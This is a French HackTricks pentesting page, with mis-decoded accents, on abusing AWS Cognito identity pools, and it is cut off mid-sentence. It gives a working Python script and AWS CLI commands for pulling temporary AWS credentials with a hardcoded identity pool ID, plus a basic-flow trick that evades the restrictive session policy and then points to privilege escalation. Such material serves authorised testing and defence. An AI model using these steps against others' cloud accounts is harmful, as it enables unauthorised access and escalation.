# Pools d'identit√©s Cognito

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

</details>

## Informations de base

Avec un pool d'identit√©s, vos utilisateurs peuvent **obtenir des informations d'identification AWS temporaires pour acc√©der aux services AWS**, tels que Amazon S3 et DynamoDB. Les pools d'identit√©s prennent en charge les utilisateurs invit√©s anonymes, ainsi que les fournisseurs d'identit√© suivants que vous pouvez utiliser pour authentifier les utilisateurs pour les pools d'identit√©s :

* Pools d'utilisateurs Amazon Cognito
* Connexion sociale avec Facebook, Google, Login with Amazon et Sign in with Apple
* OpenID Connect (OIDC) fournisseurs
* Fournisseurs d'identit√© SAML
* Identit√©s authentifi√©es par les d√©veloppeurs

### Cognito Sync

Pour g√©n√©rer des sessions de pool d'identit√©s, vous devez d'abord **g√©n√©rer un ID d'identit√©**. Cet ID d'identit√© est l'**identification de la session de cet utilisateur**. Ces identifications peuvent avoir jusqu'√† 20 ensembles de donn√©es qui peuvent stocker jusqu'√† 1 Mo de paires cl√©-valeur.

Cela est **utile pour conserver les informations d'un utilisateur** (qui utilisera toujours le m√™me ID d'identit√©).

De plus, le service **cognito-sync** est le service qui permet de **g√©rer et synchroniser ces informations** (dans les ensembles de donn√©es, en envoyant des informations dans des flux et des messages SNS...).

## Acc√®s aux r√¥les IAM

### Non authentifi√©

La seule chose qu'un attaquant doit savoir pour **obtenir des informations d'identification AWS** dans une application Cognito en tant qu'utilisateur non authentifi√© est l'**ID du pool d'identit√©s**, et cet **ID doit √™tre cod√© en dur** dans l'application web/mobile pour qu'elle l'utilise. Un ID ressemble √† ceci : `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (il n'est pas brute-forceable).

{% hint style="success" %}
Le **r√¥le IAM Cognito non authentifi√© cr√©√© via est appel√©** par d√©faut `Cognito_<nom du pool d'identit√©s>Unauth_Role`
{% endhint %}

Si vous trouvez un ID de pool d'identit√©s cod√© en dur et qu'il permet aux utilisateurs non authentifi√©s, vous pouvez obtenir des informations d'identification AWS avec :

```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
    print(f"Not valid id: {id_pool_id}")
    exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```

Ou vous pouvez utiliser les **commandes aws cli** suivantes :

```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```

{% hint style="warning" %}
Notez que par d√©faut, un utilisateur cognito **non authentifi√© NE PEUT PAS avoir de permission, m√™me s'il a √©t√© attribu√© via une strat√©gie**. V√©rifiez la section suivante.
{% endhint %}

### Flux d'authentification am√©lior√© vs de base

La section pr√©c√©dente a suivi le **flux d'authentification am√©lior√© par d√©faut**. Ce flux d√©finit une **politique de session restrictive** [**session policy**](../../aws-basic-information/#session-policies) pour la session de r√¥le IAM g√©n√©r√©e. Cette politique ne permettra √† la session d'utiliser que les services de cette liste (m√™me si le r√¥le avait acc√®s √† d'autres services).

Cependant, il existe un moyen de contourner cela, si le **pool d'identit√©s a activ√© le "flux de base (classique)"**, l'utilisateur pourra obtenir une session en utilisant ce flux qui **n'aura pas cette politique de session restrictive**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn <role_arn> --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si vous recevez cette **erreur**, c'est parce que le **flux de base n'est pas activ√© (par d√©faut)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

En ayant un ensemble d'informations d'identification IAM, vous devriez v√©rifier [√† quel acc√®s vous avez](../../#whoami) et essayer de [d√©velopper les privil√®ges](../../aws-privilege-escalation/).

### Authentifi√©

{% hint style="info" %}
N'oubliez pas que les **utilisateurs authentifi√©s** se verront probablement accorder **diff√©rentes autorisations**, donc si vous pouvez **vous inscrire dans l'application**, essayez de le faire et d'obtenir les nouvelles informations d'identification.
{% endhint %}

Il pourrait √©galement y avoir des **r√¥les** disponibles pour les **utilisateurs authentifi